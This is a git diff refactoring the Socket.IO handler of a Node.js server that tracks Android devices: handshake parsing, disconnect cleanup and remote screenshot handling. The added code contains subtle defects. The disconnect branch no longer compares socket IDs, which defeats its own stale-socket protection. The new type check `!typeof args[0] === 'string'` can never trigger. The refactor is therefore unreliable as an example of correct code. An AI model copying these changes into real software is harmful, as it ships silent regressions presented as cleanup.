@@ -140,36 +140,28 @@ const androidIo = io.of('/android');
 // ===== SOCKET.IO SETUP =====
 
 androidIo.on("connection", async (socket) => {
-    const connectionId = socket.id;
-    console.log(chalk.cyan(`[i] New connection attempt from ${connectionId}`));
+    console.log(chalk.cyan(`[i] [conn: ${socket.id}] New connection attempt from a device`));
 
     try {
-        const dataStr = socket.handshake.query.info;
         const clientConfigHash = socket.handshake.query.config_hash; // Client sends its current config hash
 
-        if (!dataStr) {
-            console.log(chalk.red(`[!] No 'info' query param [conn ${socket.id}] - disconnecting`));
-            socket.disconnect();
-            return;
-        }
-
-        let data;
+        let deviceUuid = null;
         try {
-            data = JSON.parse(dataStr);
-        } catch (e) {
-            console.log(chalk.red(`[!] Failed to parse JSON from 'info' param [conn ${socket.id}] - disconnecting`));
+            const dataStr = socket.handshake.query.info;
+            if (!dataStr) {
+                throw new Error('Missing info parameter');
+            }
+            const data = JSON.parse(dataStr);
+            deviceUuid = data.device_uuid;
+            if (!deviceUuid) {
+                throw new Error("'device_uuid' missing in 'info' data");
+            }
+            socket.deviceUuid = deviceUuid;
+        } catch (error) {
+            console.log(chalk.red(`[!] [conn: ${socket.id}] An error ocurred during handshake: ${error.message}`));
             socket.disconnect();
             return;
         }
-
-        const deviceUuid = data.device_uuid;
-        if (!deviceUuid) {
-            console.log(chalk.red(`[!] 'device_uuid' missing in 'info' data [conn ${socket.id}] - disconnecting`));
-            socket.disconnect();
-            return;
-        }
-
-        socket.deviceUuid = deviceUuid;
 
         let device = devices.get(deviceUuid);
         if (device) {
@@ -194,7 +186,7 @@ androidIo.on("connection", async (socket) => {
             };
             devices.set(deviceUuid, device);
         }
-        console.log(chalk.cyan(`[i] Device ${deviceUuid} successfully connected [conn ${socket.id}]`));
+        console.log(chalk.cyan(`[i] [conn: ${socket.id}] Device ${deviceUuid} successfully connected`));
 
         // UPSERT device info in DB
         await db.run(
@@ -233,45 +225,39 @@ androidIo.on("connection", async (socket) => {
                 return;
             }
 
-            console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid}) - Reason: ${reason}`));
-
             const currentDeviceInMap = devices.get(deviceUuid);
-
-            // Only proceed with cleanup if the disconnecting socket is the
-            // same one we have registered for this device in the map.
-            if (currentDeviceInMap && currentDeviceInMap.socket.id === socket.id) {
-
-                console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid}) - Clean Exit`));
-
-                // Clean up any pending screenshot responses for this device
-                for (const [requestId, request] of pendingScreenshotResponses.entries()) {
-                    if (request.device_uuid === deviceUuid) {
-                        clearTimeout(request.timeout);
-                        // Broadcast error to all frontends
-                        frontendIo.emit("screenshot_error", {
-                            device_uuid: deviceUuid,
-                            error: "Device disconnected while taking screenshot"
-                        });
-                        pendingScreenshotResponses.delete(requestId);
-                    }
-                }
-
-                devices.delete(deviceUuid);
-
-                // Update last_seen in DB
-                await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid);
-
-                // Broadcast updated device list
-                const deviceList = Array.from(devices.values()).map((d) => ({
-                    ...d.info,
-                    ID: d.info.device_uuid
-                })).slice(0, 20);
-                frontendIo.emit("devices", deviceList);
-
-            } else {
+            if (!currentDeviceInMap || !currentDeviceInMap.socket.id) {
                 // If we enter here, it's a disconnection of a "ghost" or old socket
-                console.log(chalk.yellow(`[i] Stale socket disconnected for ${deviceUuid} (ID: ${socket.id}). Ignoring cleanup to preserve new connection.`));
+                console.log(chalk.yellow(`[i] [conn: ${socket.id}] Stale socket disconnected for ${deviceUuid}. Ignoring cleanup to preserve new connection.`));
+                return;
             }
+
+            console.log(chalk.redBright(`[x] [conn: ${socket.id}] Device Disconnected (${deviceUuid}) - Reason: ${reason}`));
+
+            // Clean up any pending screenshot responses for this device
+            for (const [requestId, request] of pendingScreenshotResponses.entries()) {
+                if (request.device_uuid === deviceUuid) {
+                    clearTimeout(request.timeout);
+                    // Broadcast error to all frontends
+                    frontendIo.emit("screenshot_error", {
+                        device_uuid: deviceUuid,
+                        error: "Device disconnected while taking screenshot"
+                    });
+                    pendingScreenshotResponses.delete(requestId);
+                }
+            }
+
+            devices.delete(deviceUuid);
+
+            // Update last_seen in DB
+            await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid);
+
+            // Broadcast updated device list
+            const deviceList = Array.from(devices.values()).map((d) => ({
+                ...d.info,
+                ID: d.info.device_uuid
+            })).slice(0, 20);
+            frontendIo.emit("devices", deviceList);
         });
 
         // Handle logger events from Android device
@@ -334,8 +320,10 @@ androidIo.on("connection", async (socket) => {
                 let buffer;
                 let requestId = null;
 
-                // Handle two separate parameters: request_id and imageData
-                if (args.length === 2 && typeof args[0] === 'string') {
+                if (args.length === 2) {
+                    if (!typeof args[0] === 'string' ) {
+                        throw new Error('Expect string, got ' + typeof args[0]);
+                    }
                     requestId = args[0];
                     const imageData = args[1];
 
